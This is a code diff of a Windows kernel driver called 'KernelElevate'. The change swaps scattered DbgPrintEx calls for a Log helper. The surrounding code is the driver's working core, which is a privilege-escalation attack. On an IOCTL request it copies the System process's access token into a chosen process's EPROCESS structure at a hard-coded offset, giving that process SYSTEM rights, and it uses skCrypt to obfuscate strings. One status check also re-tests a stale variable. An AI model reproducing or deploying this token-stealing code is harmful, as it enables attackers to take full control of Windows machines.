@@ -1,9 +1,21 @@
 #include <ntifs.h>
+#include <stdarg.h>
 #include "skCrypt.h"
 #pragma warning(disable: 6328 6273) // disable DbgPrintEx warnings
 
 constexpr ULONG requestElevate = CTL_CODE(FILE_DEVICE_UNKNOWN, 0x777, METHOD_BUFFERED, FILE_SPECIAL_ACCESS);
 #define dbgmode
+
+void Log(const char* text, ...) {
+    va_list(args);
+    va_start(args, text);
+
+    #if defined(dbgmode)
+        vDbgPrintExWithPrefix("[KernelElevate] ", 0, 0, text, args);
+    #endif
+
+    va_end(args);
+}
 
 extern "C" {
     char* PsGetProcessImageFileName(PEPROCESS Process);
@@ -11,47 +23,29 @@ extern "C" {
 }
 
 bool elevateRights(int PID) {
-    PVOID proc = NULL;
-    PVOID ntoskrnl = NULL;
-    PACCESS_TOKEN targetToken;
-    PACCESS_TOKEN ntoskrnlToken;
+    PVOID proc = NULL, ntoskrnl = NULL;
+    PACCESS_TOKEN targetToken, ntoskrnlToken;
     __try {
         NTSTATUS ret = PsLookupProcessByProcessId((HANDLE)PID, (PEPROCESS*)&proc);
         if (ret != STATUS_SUCCESS) {
-            if (ret == STATUS_INVALID_PARAMETER) {
-                #if defined(dbgmode)
-                    DbgPrintEx(0, 0, "the PID is invalid.\n");
-                #endif
-            }
-            if (ret == STATUS_INVALID_CID) {
-                #if defined(dbgmode)
-                    DbgPrintEx(0, 0, "the CID is invalid.\n");
-                #endif
-            }
+            if (ret == STATUS_INVALID_PARAMETER) Log("the PID is invalid.\n");
+            if (ret == STATUS_INVALID_CID) Log("the CID is invalid.\n");
+
             return FALSE;
         }
 
         PsLookupProcessByProcessId((HANDLE)0x4, (PEPROCESS*)&ntoskrnl);
 
         if (ret != STATUS_SUCCESS) {
-            if (ret == STATUS_INVALID_PARAMETER) {
-                #if defined(dbgmode)
-                    DbgPrintEx(0, 0, "ntoskrnl PID was not found.");
-                #endif
-            }
-            if (ret == STATUS_INVALID_CID) {
-                #if defined(dbgmode)
-                    DbgPrintEx(0, 0, "ntoskrnl PID is not valid.");
-                #endif
-            }
+            if (ret == STATUS_INVALID_PARAMETER) Log("ntoskrnl PID was not found.\n");
+            if (ret == STATUS_INVALID_CID) Log("ntoskrnl PID is not valid.\n");
+
             ObDereferenceObject(proc);
             return FALSE;
         }
-
-        #if defined(dbgmode)
-            char* peName;
-            DbgPrintEx(0, 0, "pe name: %s\n", peName = PsGetProcessImageFileName((PEPROCESS)proc));
-        #endif
+        
+        char* peName;
+        Log("pe name: %s\n", peName = PsGetProcessImageFileName((PEPROCESS)proc));
 
         targetToken = PsReferencePrimaryToken((PEPROCESS)proc);
         if (!targetToken) {
@@ -60,9 +54,7 @@ bool elevateRights(int PID) {
             return FALSE;
         }
 
-        #if defined(dbgmode)
-            DbgPrintEx(0, 0, "%s token: %x\n", peName, targetToken);
-        #endif
+        Log("%s token: %x\n", peName, targetToken);
 
         ntoskrnlToken = PsReferencePrimaryToken((PEPROCESS)ntoskrnl);
         if (!ntoskrnlToken) {
@@ -72,27 +64,16 @@ bool elevateRights(int PID) {
             return FALSE;
         }
 
-        #if defined(dbgmode)
-            DbgPrintEx(0, 0, "ntoskrnl token: %x\n", ntoskrnlToken);
-        #endif
-
+        Log("ntoskrnl token: %x\n", ntoskrnlToken);
         ULONG_PTR UProcIdAddr = (ULONG_PTR)proc + 0x4b8;
 
-        #if defined(dbgmode)
-            DbgPrintEx(0, 0, "%s token addr: %x\n", peName, UProcIdAddr);
-        #endif
-
+        Log("%s token addr: %x\n", peName, UProcIdAddr);
         ULONG_PTR ntoskrnladdr = (ULONG_PTR)ntoskrnl + 0x4b8;
 
-        #if defined(dbgmode)
-            DbgPrintEx(0, 0, "ntoskrnl token addr: %x\n", ntoskrnladdr);
-        #endif
-
+        Log("ntoskrnl token addr: %x\n", ntoskrnladdr);
         *(PHANDLE)UProcIdAddr = *(PHANDLE)ntoskrnladdr;
 
-        #if defined(dbgmode)
-            DbgPrintEx(0, 0, "%s token upgraded to: %x ", peName, *(PHANDLE)(UProcIdAddr));
-        #endif
+        Log("%s token upgraded to: %x ", peName, *(PHANDLE)(UProcIdAddr));
     }
     __except (EXCEPTION_EXECUTE_HANDLER) {
         return FALSE;
@@ -118,9 +99,7 @@ NTSTATUS IoControl(PDEVICE_OBJECT devObj, PIRP irp) {
 
             RtlCopyMemory(&recvPID, irp->AssociatedIrp.SystemBuffer, sizeof(recvPID));
             status = elevateRights(recvPID);
-            #if defined(dbgmode)
-                DbgPrintEx(0, 0, "received PID: %d\n", recvPID);
-            #endif
+            Log("received PID: %d\n", recvPID);
         }
     }
     IoCompleteRequest(irp, IO_NO_INCREMENT);
